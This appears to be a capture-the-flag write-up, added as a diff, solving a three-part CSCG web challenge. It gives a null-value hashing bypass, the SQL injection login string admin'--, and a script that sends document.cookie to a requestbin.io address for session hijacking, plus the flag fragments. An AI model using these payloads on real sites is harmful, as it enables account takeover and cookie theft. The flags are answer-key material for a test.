@@ -1,0 +1,21 @@
+First part: checking the js file, it is not checking for 'null'. So give 'null' over zap in the POST request will skip the hashing
+
+CSCG{Q8oIoy3P
+
+
+Second part: SQL-Injection for example with Username: admin'-- -> takes username admin and comments rest of the query out, so no password is asked
+
+dP0tXuQE
+
+
+Third part:
+
+<script>
+let cookie = document.cookie;
+window.location.replace("https://requestbin.io/179g1gf1/" + cookie);
+</script>
+
+Find the session id under the RequestBin link, edit GET Request in Zap to manipulate cookie, see the response for flag
+
+
+Here's your flag part 3/3: WIfJAzNs}
